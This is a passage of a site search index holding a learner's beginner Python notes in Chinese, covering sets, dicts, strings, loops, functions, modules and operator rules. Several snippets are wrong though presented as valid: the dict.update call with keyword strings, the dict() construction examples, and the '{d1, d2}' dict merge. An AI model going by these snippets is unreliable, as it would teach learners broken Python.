<p>set()\u53ef\u4ee5\u5c06\u5217\u8868\u548c\u5143\u7ec4\u8f6c\u6362\u8fc7\u6765\uff0c\u96c6\u5408\u6700\u91cd\u8981\u7684\u5c5e\u6027\u662f\u6ca1\u6709\u91cd\u590d\u5143\u7d20\uff0c\u5982\u679c\u521b\u5efa\u7684\u65f6\u5019\u5199\u4e86\u91cd\u590d\u5143\u7d20\uff0c\u4f46\u662f\u521b\u5efa\u5b8c\u6210\u7684\u65f6\u5019\u4f1a\u88ab\u6d88\u9664\u91cd\u590d\u503c</p> <pre><code>set(\"123\") = {\"1\",\"2\",\"3\"}\n</code></pre> <ul> <li>add() remove() \u589e\u5220\u5143\u7d20</li> <li>min() max() len() sum()</li> <li>\u5185\u90e8\u5143\u7d20\u65e0\u5e8f\uff0c\u4e0d\u80fd\u4e0b\u6807\u8bbf\u95ee</li> <li>\u5faa\u73af\u904d\u5386\u7684\u7ed3\u679c\u662f\u786e\u5b9a\u7684\uff1f</li> <li>issubset(s2) issuperset(s1) == !=\u5224\u65ad\u96c6\u5408\u5173\u7cfb</li> <li>\u4e5f\u53ef\u4ee5\u7528 &lt; &lt;= &gt; &gt;= \u6765\u5224\u65ad\u96c6\u5408\u5173\u7cfb\uff0c\u771f\u5b50\u96c6\uff0c\u5b50\u96c6\uff0c\u771f\u8d85\u96c6\uff0c\u8d85\u96c6</li> <li>\u200b\u200b</li> </ul> <p>\u628a\u5217\u8868\u8f6c\u6362\u6210set\u518d\u8f6c\u6362\u6210\u5217\u8868\uff0c\u786e\u5b9e\u53ef\u4ee5\u505a\u5230\u53bb\u91cd\uff0c\u4f46\u662f\u987a\u5e8f\u4e0d\u80fd\u4fdd\u8bc1\uff0c\u4f46\u662f\u53ef\u4ee5\u6700\u540e\u518d\u52a0\u4e00\u4e2a\u6392\u5e8f\uff0ckey = \u539f\u5217\u8868.index</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_1","title":"\u5b57\u5178","text":"<pre><code>scores = {'AAA':88,'BBB':99,'CCC':100}\nAscore = scores['AAA']\nscores.update('DDD'=77,'EEE'=66)\nscores.pop('AAA')\n</code></pre> <p>\u521b\u5efa\u5b57\u5178\u6709\u5f88\u591a\u65b9\u6cd5</p> <ul> <li>d = {1:\"hello\"}</li> <li>d = dict([(1:\"hello\"),(2:\"world\")])</li> <li>d = dict(1=\"hello\", 2=\"world\")</li> </ul> <p>\u53ef\u53d8\u5bf9\u8c61\u4e0d\u53ef\u4f5c\u4e3a\u5b57\u5178\u7684\u952e\uff0c\u6bd4\u5982\u5217\u8868\u548c\u5b57\u5178</p> <p>\u6570\u5b57\uff0c\u5b57\u7b26\u4e32\u548c\u5143\u7ec4\u90fd\u53ef\u4ee5</p> <ul> <li>del d['\u5f20\u4e09'] \u5220\u9664\u6761\u76ee\uff0c\u627e\u4e0d\u5230\u629b\u51fa\u5f02\u5e38</li> <li>d['\u674e\u56db'] = 1 \u589e\u52a0\u6761\u76ee\uff0c\u4e0d\u80fd\u4e0d\u52a0\u7b49\u53f7\uff0c\u4f1a\u53d8\u6210\u8bbf\u95ee\uff0c\u8bbf\u95ee\u5931\u8d25\u5c31\u53d8\u6210\u5f02\u5e38</li> <li>\u5faa\u73af\u5faa\u73af\u7684\u662f\u952e\uff0cin not in \u4e5f\u5224\u65ad\u7684\u662f\u952e</li> <li>\u5b57\u5178\u5408\u5e76 d3 = {d1, d2}</li> <li>keys() \u83b7\u53d6\u952e\u5217\u8868 values() \u83b7\u53d6\u503c\u5217\u8868 items \u8fd4\u56de\u5143\u7ec4\u5217\u8868</li> <li>clear()</li> <li>get(key, value) key\u80fd\u627e\u5230\u8fd4\u56de\u8fd9\u4e2akey\u7684value\uff0c\u627e\u4e0d\u5230\u8fd4\u56de\u5f62\u53c2\u7684value\uff0c\u9ed8\u8ba4\u503c\u4e3aNone</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#str","title":"str","text":"<pre><code>\"\\m\"\n\u8f93\u51fa \\m\n\u5b9e\u9645\u4e0a\u8fd9\u662f\u6709\u8bed\u6cd5\u95ee\u9898\u7684\uff0c\u56e0\u4e3a\\\u662f\u8f6c\u4e49\u7684\u6807\u5fd7\uff0c\u5982\u679c\u540e\u9762\u5b57\u7b26\u662f\u4e0d\u80fd\u8f6c\u4e49\u7684\u4f1a\u62a5\u9519\uff0c\u4f46\u662fpython\u4f1a\u5c06\u5176\u8f6c\u6362\u6210\n\"\\\\m\"\nstr(100) \u5c31\u662f \"100\"\nint(\"100\") \u5c31\u662f 100\n</code></pre> <p>python\u4e2d\u7684\u5b57\u7b26\u4e32\u652f\u6301[]\u8bbf\u95ee\uff0c\u540c\u65f6\u652f\u6301\u5de6\u95ed\u53f3\u5f00\u7684\u5207\u7247\uff0c\u4f46\u5176\u672c\u8d28\u4e0a\u5c5e\u4e8e\u4e0d\u53ef\u4fee\u6539\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4e0d\u80fd\u901a\u8fc7[]\u548c\u5207\u7247\u53bb\u66f4\u65b0\u5176\u5185\u90e8\u7684\u503c</p> <p>\u4f46\u662f\u5176\u5141\u8bb8\u5b57\u7b26\u4e32\u7684\u62fc\u63a5\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7replace\u65b9\u6cd5\u66f4\u65b0\u5176\u5185\u90e8\u7684\u503c</p> <p>\u5b57\u7b26\u4e32\u7c7b\u578b\u4e0d\u80fd\u76f4\u63a5\u4e0e\u5176\u4ed6\u7c7b\u578b\u76f8\u52a0</p> <pre><code>ch = \"cc\" + 123 #error\n</code></pre> <p>\u4e00\u4e9b\u5173\u952e\u7684\u65b9\u6cd5</p> <ul> <li>format \u89c1\u683c\u5f0f\u5316\u8f93\u5165\u8f93\u51fa</li> <li>strip() \u53bb\u9664\u5de6\u53f3\u7a7a\u683c \u8fd8\u6709lstrip()\u548crstrip()</li> <li>split() \u6309\u7167\u67d0\u4e2a\u5143\u7d20\u5206\u5272\uff0c\u9ed8\u8ba4\u4e3a\u7a7a\u683c\uff0c\u5982\u679c\u6709\u8fde\u7eed\u7684\u4e24\u4e2a\u5206\u5272\u5143\u7d20\uff0c\u4f1a\u751f\u6210\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32</li> <li>find() \u6309\u7167\u67d0\u4e2astr\u53bb\u627e\uff0c\u5982\u679c\u6709\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2aindex\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u8fd4\u56de-1\uff0c\u53ef\u4ee5\u6709\u7b2c\u4e8c\u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u5b57\u7b26\u4e32\u505a\u5207\u7247</li> <li>join()  <code>str1.join(str\u6216\u8005\u5217\u8868)</code>\u200b  \u5982\u679cjoin\u53c2\u6570\u662fstr\uff0c\u5219\u4f1a\u628astr\u6309\u5b57\u7b26\u5206\u5272\uff0c\u6bcf\u4e2a\u5206\u5272\u91cc\u653e\u4e00\u4e2astr1\uff1b\u653e\u5217\u8868\u4e4b\u7c7b\u7684\u4e5f\u662f\u4e00\u6837\u7684\uff0c\u4e0d\u8fc7\u662f\u6309\u7167\u5217\u8868\u5206\u5272</li> <li></li> <li> <p>index() \u901a\u7528\u7684\u5e8f\u5217\u5b50\u5217\u67e5\u627e\uff0c\u6ca1\u627e\u5230\u8fd4\u56deValueError\uff0c\u9700\u8981\u4f7f\u7528\u5f02\u5e38\u6355\u83b7</p> </li> <li>find() \u53ea\u5bf9\u4e8e\u5b57\u7b26\u4e32\uff0c\u6ca1\u627e\u5230\u8fd4\u56de -1</li> <li>lower() upper() \u8f6c\u6362\u5927\u5c0f\u5199</li> <li>replace(\"old sub str\",\"new sub str\") \u4e0d\u662f\u76f4\u63a5\u5728str\u4e0a\u4fee\u6539\uff0c\u662f\u8fd4\u56de\u4fee\u6539\u5b8c\u7684str\uff0c\u5982\u679c\u672a\u627e\u5230\u8001\u7684\u5b57\u7b26\u4e32\uff0c\u5219\u4e0d\u505a\u4fee\u6539\uff0c\u8fd4\u56de\u539f\u5b57\u7b26\u4e32\uff0c\u4e5f\u4e0d\u4f1a\u62a5\u9519</li> <li>count(\"sub str\") \u67e5\u627e\u5b50\u4e32\u51fa\u73b0\u6b21\u6570</li> <li>title() \u8fd4\u56de\u65b0\u7684\u5b57\u7b26\u4e32\uff0c\u91cc\u9762\u6240\u6709\u5355\u8bcd\u7684\u5f00\u5934\u5b57\u6bcd\u5927\u5199</li> <li>isdigit() \u4e0d\u652f\u6301 + - \u53ea\u6709\u8fde\u7eed\u7eaf\u6570\u5b57\u624d\u884c</li> <li>isalpha() \u53ea\u652f\u6301\u8fde\u7eed\u7eaf\u5b57\u6bcd</li> </ul> <p>chr</p> <p>char\u7c7b\u578b\u548c\u6570\u5b57\u4e4b\u95f4\u7684\u8f6c\u6362</p> <ul> <li>ord('0') \u662f 48 \u662fascii</li> <li>chr(48) \u662f '0'</li> </ul> <p>\u8f6c\u4e49\u5b57\u7b26</p> <ul> <li>\u200b\u200b</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#complex","title":"complex","text":"<p>\u8f93\u51fa\u7684\u65f6\u5019\u52a0()</p> <pre><code>&gt;&gt;&gt;complex(1, 2)\n(1 + 2j)\n\n&gt;&gt;&gt; complex(1)    # \u6570\u5b57\n(1 + 0j)\n\n&gt;&gt;&gt; complex(\"1\")  # \u5f53\u505a\u5b57\u7b26\u4e32\u5904\u7406\n(1 + 0j)\n\n# \u6ce8\u610f\uff1a\u8fd9\u4e2a\u5730\u65b9\u5728\"+\"\u53f7\u4e24\u8fb9\u4e0d\u80fd\u6709\u7a7a\u683c\uff0c\u4e5f\u5c31\u662f\u4e0d\u80fd\u5199\u6210\"1 + 2j\"\uff0c\u5e94\u8be5\u662f\"1+2j\"\uff0c\u5426\u5219\u4f1a\u62a5\u9519\n&gt;&gt;&gt; complex(\"1+2j\")\n(1 + 2j)\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#bool","title":"bool","text":"<p>Python\u4e2d\u7684bool\u7c7b\u578b\u662fTrue\u548cFalse</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_2","title":"\u5b57\u7b26\u4e32","text":"<p>\u5bf9\u4e8e\u6559\u6750\u4e2d\u63d0\u5230\u7684\u5e38\u7528\u51fd\u6570\u9700\u8981\u505a\u4e00\u4e2a\u4e86\u89e3</p> <ul> <li>\u4f7f\u7528\u539f\u59cb\u5b57\u7b26\u4e32 <code>s = r'hello'</code>\u200b\u4e5f\u5373\u4e0d\u4f7f\u7528\u8f6c\u4e49\u5b57\u7b26\uff0c\u5c31\u539f\u6837\u8f93\u51fa\uff0c\u5c24\u5176\u662f\u6211\u4eec\u9700\u8981\u8f93\u51fa\u53cd\u659c\u6760\u7684\u65f6\u5019</li> <li>\u5220\u9664\u524d\u540e\u7a7a\u683c <code>'  hello '.strip()</code>\u200b</li> <li> <p>\u67e5\u627e\u5b50\u4e32\uff0c\u627e\u5230\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5b50\u4e32\u7684\u4f4d\u7f6e</p> </li> <li> <p>index() \u901a\u7528\u7684\u5e8f\u5217\u5b50\u5217\u67e5\u627e\uff0c\u6ca1\u627e\u5230\u8fd4\u56deValueError\uff0c\u9700\u8981\u4f7f\u7528\u5f02\u5e38\u6355\u83b7</p> </li> <li>find() \u53ea\u5bf9\u4e8e\u5b57\u7b26\u4e32\uff0c\u6ca1\u627e\u5230\u8fd4\u56de -1</li> <li>\u662f\u5426\u4e3a\u82f1\u6587\u5b57\u6bcd</li> <li>\u662f\u5426\u4e3a\u6570\u5b57\u5b57\u7b26</li> </ul> <p>\u5b57\u7b26\u4e32\u5185\u5bb9\u7684\u4fee\u6539\u53ea\u80fd\u901a\u8fc7\u5f62\u6210\u65b0\u7684\u5b57\u7b26\u4e32\uff0c\u5176\u5185\u90e8\u7684title\uff0creplace\u7b49\u51fd\u6570\u4e5f\u90fd\u662f\u5f62\u6210\u65b0\u7684\u5b57\u7b26\u4e32</p> <ul> <li>str\u7684\u683c\u5f0f\u8f6c\u6362\u51fd\u6570 d 0o b x X f e s  \u683c\u5f0f\u5b57\u7b26\u4e0e\u5f15\u7528\u6570\u636e\u7c7b\u578b\u8981\u4e00\u81f4\uff0c\u6574\u6570\u53ef\u4ee5\u6307\u5b9a\u4e0d\u540c\u8fdb\u5236</li> <li>format \u5343\u5206\u4f4d</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_3","title":"\u5217\u8868\u548c\u5143\u7ec4","text":"<p>\u5217\u8868\u53ef\u53d8\u5143\u7ec4\u4e0d\u53ef\u53d8</p> <p>\u5217\u8868</p> <p>\u4e8c\u7ef4\u5217\u8868\u7684\u6bcf\u4e2a\u5143\u7d20\u957f\u5ea6\u6ca1\u6709\u9650\u5236\uff0c\u56e0\u4e3a\u5176\u5185\u90e8\u7684\u5143\u7d20\u7c7b\u578b\u662f\u6ca1\u6709\u9650\u5236\u7684</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#part3","title":"Part3 \u5206\u652f\u4e0e\u5faa\u73af","text":"<p>\u5206\u652f\u7ed3\u6784</p> <pre><code>x = float(input('x = '))\nif x &gt; 1:\n    y = 3 * x - 5\nelif x &gt;= -1:\n    y = x + 2\nelse:\n    y = 5 * x + 3\n</code></pre> <p>python\u53ef\u4ee5\u76f4\u63a5\u7528 'and' \u4ee3\u66ff &amp;&amp;</p> <p>\u5faa\u73af\u7ed3\u6784</p> <p>for \u5faa\u73af\u4e2d\u5e38\u4f7f\u7528\u5230\u4e00\u4e2a\u53ebrange\u7684\u529f\u80fd</p> <ul> <li>\u200b<code>range(101)</code>\u200b\uff1a\u53ef\u4ee5\u7528\u6765\u4ea7\u751f0\u5230100\u8303\u56f4\u7684\u6574\u6570\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u53d6\u4e0d\u5230101\u3002</li> <li>\u200b<code>range(1, 101)</code>\u200b\uff1a\u53ef\u4ee5\u7528\u6765\u4ea7\u751f1\u5230100\u8303\u56f4\u7684\u6574\u6570\uff0c\u76f8\u5f53\u4e8e\u524d\u9762\u662f\u95ed\u533a\u95f4\u540e\u9762\u662f\u5f00\u533a\u95f4\u3002</li> <li>\u200b<code>range(1, 101, 2)</code>\u200b\uff1a\u53ef\u4ee5\u7528\u6765\u4ea7\u751f1\u5230100\u7684\u5947\u6570\uff0c\u5176\u4e2d2\u662f\u6b65\u957f\uff0c\u5373\u6bcf\u6b21\u6570\u503c\u9012\u589e\u7684\u503c\u3002</li> <li>\u200b<code>range(100, 0, -2)</code>\u200b\uff1a\u53ef\u4ee5\u7528\u6765\u4ea7\u751f100\u52301\u7684\u5076\u6570\uff0c\u5176\u4e2d-2\u662f\u6b65\u957f\uff0c\u5373\u6bcf\u6b21\u6570\u5b57\u9012\u51cf\u7684\u503c\u3002</li> </ul> <pre><code>sum = 0\nfor x in range(101):\n    sum += x\nprint(sum)\n</code></pre> <p>while \u5faa\u73af\u4e0ec\u7c7b\u4f3c\uff0c\u540c\u6837\u53ef\u4ee5\u4f7f\u7528break\u8df3\u51fa</p> <p>\u91cc\u9762\u6709for\u548cwhile\u5faa\u73af\u8fd8\u53ef\u4ee5\u52a0else\u8bed\u53e5\uff0c\u53ea\u8981\u4e0dbreak\u5c31\u4f1a\u6267\u884celse</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#part4-function","title":"Part4 function","text":"<pre><code>def sayHello():\n    print(\"hello world\")\n</code></pre> <p>\u7531\u4e8epython\u5bf9\u4e8e\u7c7b\u578b\u68c0\u67e5\u8f83\u4e3a\u81ea\u7531\uff0c\u56e0\u6b64python\u4e0d\u9700\u8981\u51fd\u6570\u91cd\u8f7d\uff0c\u4f46\u662fpython\u652f\u6301\u9ed8\u8ba4\u53c2\u6570</p> <pre><code>def roll_dice(n=2):\n    \"\"\"\u6447\u8272\u5b50\"\"\"\n    total = 0\n    for _ in range(n):\n        total += randint(1, 6)\n    return total\n</code></pre> <p>\u7279\u6b8a\u7684\u51fd\u6570 lambda \u8868\u8fbe\u5f0f</p> <pre><code>func = lambda x,y,z: x+y+z\nprint(func(1,2,3))\n</code></pre> <p>\u51fd\u6570\u4e5f\u662f\u5bf9\u8c61\uff0c\u6709id, type \u548c value</p> <p>\u200b\u200b</p> <p>Python\u5904\u7406\u51fd\u6570\u53c2\u6570\u6709\u4e00\u4e9b\u66f4\u7075\u6d3b\u7684\u65b9\u6cd5</p> <ul> <li>\u4f4d\u7f6e\u53c2\u6570\uff0c\u6309\u7167\u6b63\u5e38\u51fd\u6570\u7684\u610f\u601d\uff0c\u987a\u5e8f\u5199\u8fc7\u53bb <code>func(1,2,3)</code>\u200b</li> <li>\u5173\u952e\u8bcd\u53c2\u6570\uff0c\u5bf9\u7167\u5f62\u53c2\u5199\uff0c<code>func(x=1,y=2,z=3)</code>\u200b</li> <li> <p>\u4f4d\u7f6e\u53c2\u6570+\u5173\u952e\u8bcd\u53c2\u6570\u6df7\u7528\uff0c\u5fc5\u987b\u5148\u5199\u4f4d\u7f6e\u53c2\u6570\uff0c\u518d\u5199\u5173\u952e\u8bcd\u53c2\u6570\uff0c\u4f4d\u7f6e\u53c2\u6570\u5148\u5360\u7528</p> </li> <li> <p>\u200b<code>func(1,z=2,y=3)</code>\u200b</p> </li> <li>\u9ed8\u8ba4\u53c2\u6570\uff0c\u53c2\u7167cpp\uff0c\u6709\u9ed8\u8ba4\u53c2\u6570\u540e\uff0c\u540e\u9762\u7684\u53c2\u6570\u4e5f\u5fc5\u987b\u6709\u9ed8\u8ba4\u53c2\u6570</li> <li> <p>\u4e0d\u5b9a\u957f\u53c2\u6570\uff0c\u4f1a\u5c06\u8fd9\u4e9b\u53c2\u6570\u5316\u4e3a\u4e00\u5143\u5143\u7ec4</p> </li> <li> <p><code>python     def cun(a, *b):         print(b)     cun(1,2,3,4) \u8f93\u51fa(2,3,4)     cun(1) \u8f93\u51fa()</code></p> </li> <li> <p>\u5b57\u5178\u53c2\u6570</p> </li> <li><code>python   def func(**a):     print(a)   func(x1 = 1) \u8f93\u51fa{\"x1\": 1}</code></li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u5b9e\u53c2\u53ef\u53d8\uff0c\u5f62\u53c2\u53ef\u4ee5\u5f71\u54cd\u5b9e\u53c2\uff1b\u53cd\u4e4b\u4e0d\u80fd\u5f71\u54cd</p> <p>\u4e0dreturn\uff0c\u6216\u8005return\u540e\u9762\u4e0d\u52a0\u8868\u8fbe\u5f0f\uff0c\u90fd\u8fd4\u56deNone</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#part5-module","title":"Part5 module","text":"<p>python\u7684\u6587\u4ef6\u652f\u6301\u6a21\u5757\u5316\u5904\u7406\uff0c\u4f8b\u5982\u6211\u4eec\u5728\u591a\u4e2a\u6587\u4ef6\u91cc\u90fd\u5b9a\u4e49\u4e86\u540c\u540d\u51fd\u6570foo</p> <pre><code>from module1 import foo \n</code></pre> <p>\u7528\u4e0a\u8ff0\u505a\u6cd5\u6765\u83b7\u53d6\u7279\u5b9a\u7684foo\uff0c\u6216\u8005</p> <pre><code>import module1 as m1\nimport module2 as m2\n\nm1.foo()\nm2.foo()\n</code></pre> <p>\u7528\u4e0a\u8ff0\u65b9\u6cd5\u6765\u533a\u5206</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#part6","title":"Part6 \u8fd0\u7b97\u7b26\u53f7","text":"<ul> <li>\u7b97\u672f\u8fd0\u7b97\u7b26</li> <li>\u5173\u7cfb\u8fd0\u7b97\u7b26</li> <li>\u903b\u8f91\u8fd0\u7b97\u7b26</li> </ul> <p>python\u652f\u6301\u5f88\u591a\u79cd\u4e0d\u540c\u7684\u8fd0\u7b97\u7b26\u53f7\uff0c\u4f8b\u5982 //= \u548c /=</p> <p>/ \u4e00\u5b9a\u4f1a\u4ea7\u751f\u6d6e\u70b9\u6570\uff0c\u8f93\u51fa\u6700\u5c11\u4fdd\u7559\u4e00\u4f4d\u5c0f\u6570</p> <p>Python\u7684\u6574\u9664\u662f//\u800c\u4e0d\u662f/</p> <p>\u6d6e\u70b9\u6570\u4e5f\u53ef\u4ee5\u505a\u6574\u9664\u548c\u53d6\u4f59\uff0c\u6574\u9664\u7684\u7ed3\u679c\u662f\u6574\u6570\uff0c\u4f46\u662f\u7c7b\u578b\u662f\u6d6e\u70b9\u6570\uff0c\u6bd4\u59825.0</p> <p>Python</p> <pre><code>5.0 == 5 \u662f True\n\u5176\u4f59\u7684\u7c7b\u578b\u4e0d\u80fd\u505a\u8f6c\u6362\n</code></pre> <p>\u5b57\u7b26\u4e32\u7c7b\u578b\u4e0d\u80fd\u548c\u6574\u6570\u505a\u52a0\u6cd5</p> <p>\u6574\u9664\u662f\u5411\u4e0b\u53d6\u6574 -9 // 2 \u662f -5</p> <p>3 ** 2 ** 3 \u662f\u5012\u7740\u8ba1\u7b97\u7684 \u5148\u8ba1\u7b97\u540e\u9762\u7684 2 ** 3</p> <p>\u53ea\u6709\u5e42\u8fd0\u7b97 ** \u662f\u53f3\u7ed3\u5408\u7684\uff0c\u5176\u4f59\u5747\u662f\u5de6\u7ed3\u5408\u7684</p> <p>python\u7684\u5173\u7cfb\u8fd0\u7b97\u7b26\u4f1a\u8fde\u7eed\u4e66\u5199\uff0c\u4e2d\u95f4\u4ee5and\u5206\u5272</p> <pre><code> x&gt;0 == 1\n\u5c31\u662f x&gt;0 and 0==1\n</code></pre> <ul> <li>round\u6709\u4ec0\u4e48\u7528</li> <li>1J \u8fd9\u7c7b\u6570\u662f\u4ec0\u4e48\u610f\u601d</li> </ul> <p>Python\u4e0d\u652f\u6301\u7b49\u53f7\u7684\u4f20\u9012\uff0c\u53ea\u652f\u6301\u6700\u57fa\u7840\u7684\u591a\u53d8\u91cf\u8d4b\u503c</p> <pre><code>x=(y=(z+1))   \u662f\u9519\u8bef\u7684\na = b = c = 1 \u662f\u6b63\u786e\u7684\n</code></pre> <p>Python\u4e4b\u4e2d\u540c\u6837\u5b58\u5728\uff0c\u53ea\u8981or\u524d\u9762\u662fTrue\uff0c\u5c31\u4e0d\u505a\u540e\u9762\u7684\u4efb\u4f55\u8ba1\u7b97</p> <p>\u4f18\u5148\u7ea7\u6700\u4f4e\u7684\u662f\u6216 or\uff0c\u7136\u540e\u662f\u4e0e and, \u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u662f\u975e not</p> <p>and \uff1aa and b\uff0c\u5982\u679c a \u4e3a False\uff0ca and b \u8fd4\u56de a \u7684\u503c\uff0c\u5426\u5219\u8fd4\u56de b \u7684\u8ba1\u7b97\u503c\u3002 or\uff1aa or b\uff0c\u5982\u679c a \u662f True\uff0ca or b \u8fd4\u56de a \u7684\u503c\uff0c\u5426\u5219\u5b83\u8fd4\u56de b \u7684\u8ba1\u7b97\u503c\u3002</p> <p>0\u5728\u5224\u65ad\u7684\u65f6\u5019\u89c6\u4f5cFalse\uff0c\u4f46\u662f\u8fd8\u662f\u8f93\u51fa0</p> <p>\u540c\u65f6\u5207\u8bb0\u5f97\u77ed\u8def\u903b\u8f91</p> <p>Python\u4e2d\u6ca1\u6709 \"--x\" \u8fd9\u79cd\u81ea\u51cf\u542b\u4e49\uff0c\u5728Python\u4e2d\u8fd9\u89c6\u4e3a\u4e24\u4e2a\u88ab\u62b5\u6d88\u7684\u51cf\u53f7</p> <p>x=y=0 -&gt; x=0; y=0</p> <p>x *  *=y+12 -&gt; x=x **  (y+12)</p> <p>round</p> <p>\u662fPython\u4e2d\u7684\u56db\u820d\u4e94\u5165\u8fd0\u7b97\u7b26</p> <pre><code>round(5.5) 6\nround(5.49999999999) 5\n</code></pre> <p>\u540e\u9762\u8fd8\u53ef\u4ee5\u8ddf\u4e0a\u4e00\u4e2a\u503c\uff0c\u6765\u786e\u5b9a\u6700\u540e\u8981\u4fdd\u7559\u7684\u5230\u54ea\u4e00\u4f4d</p> <pre><code>round(15.22292,3) 15.223\nround(15.22222,3) 15.222\nround(15.00092,3) 15.001\nround(15.00010,3) 15.0\nround(15.010010,4) 15.01\n</code></pre> <p>\u4f46\u662f\u5982\u679c\u88ab\u4fdd\u7559\u7684\u51e0\u4f4d\u6709\u8fde\u7eed\u7684\u662f0\u7684\u8bdd\uff0c\u53ea\u8981\u4fdd\u7559\u4e00\u4f4d\uff0c\u6700\u591a\u4fdd\u7559\u4e00\u4f4d0\u5b58\u5728\u4e8e\u5c0f\u6570\u70b9\u540e</p> <p>python\u652f\u6301\u94fe\u5f0f\u590d\u5236\uff0c\u4f46\u662f\u4e0d\u80fd\u52a0\u62ec\u53f7</p> <pre><code>a=b=c=d=5 # \u90fd\u662f5\na=(b=9) error\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_4","title":"\u903b\u8f91\u8fd0\u7b97\u7b26","text":"<p>\u5e03\u5c14\u8868\u8fbe\u5f0f\u4e2d\u4f18\u5148\u7ea7 not&gt;and&gt;or\uff0c\u5176\u4e2d\uff0c</p> <p>and\u8868\u8fbe\u5f0f\u5982\u679c\u6240\u6709\u503c\u4e3a\u771f\uff0c\u5219\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u4e3a\u771f\u7684\u8868\u8fbe\u5f0f\uff0c\u5982\u679c\u4e3a\u5047\uff0c\u5219\u8fd4\u56de\u7b2c\u4e00\u4e2a\u4e3a\u5047\u7684\u8868\u8fbe\u5f0f</p> <p>or\u8868\u8fbe\u5f0f\u5982\u679c\u6240\u6709\u503c\u4e3a\u5047\uff0c\u5219\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u4e3a\u5047\u7684\u8868\u8fbe\u5f0f\uff0c\u5982\u679c\u4e3a\u771f\uff0c\u5219\u8fd4\u56de\u7b2c\u4e00\u4e2a\u4e3a\u771f\u7684\u8868\u8fbe\u5f0f</p> <ul> <li>0 == False \u662f True</li> <li>10 &gt; 0 == (0 &gt; 1) \u5c31\u662f 10 &gt;0 and 0 == False \u662f True</li> <li>\u200b<code>print(3 and 5 or 0)</code>\u200b \u4f1a\u8fd4\u56de5\u9996\u51483 and 5 \u90fd\u4e3a\u771f\uff0c\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\uff0c5 or 0 \u8fd4\u56de\u7b2c\u4e00\u4e2a\u4e3a\u771f\u7684 \u8fd4\u56de5</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_5","title":"\u4f4d\u8fd0\u7b97","text":"<p>\u8f6c\u6362\u62108\u4f4d\u6570\u636e\uff0c\u8fdb\u884c\u4f4d\u8fd0\u7b97</p> <p>\u4f7f\u7528\u8865\u7801</p> <p>\u6b63\u6570\u4e09\u7801\u4e00\u81f4\uff0c\u8d1f\u6570 \u53cd\u7801\u9664\u4e86\u7b26\u53f7\u4f4d\u90fd\u8981\u53d8\uff0c\u518d\u52a0\u4e00</p> <p>Python\u4f4d\u8fd0\u7b97\u7b26 ^ &amp; | ~ \u7b49\uff0c\u9700\u8981\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u540e\u8fdb\u884c\u76f8\u5e94\u8ba1\u7b97\uff0c\u6ce8\u610f\u8d1f\u6570\u7684\u8ba1\u7b97\u8981\u7528\u8865\u7801\uff08\u7b26\u53f7\u4f4d\u4e0d\u53d8\uff0c\u5176\u4f59\u4f4d\u6328\u4e2a\u53d6\u53cd\u540e\u52a01\uff09</p> 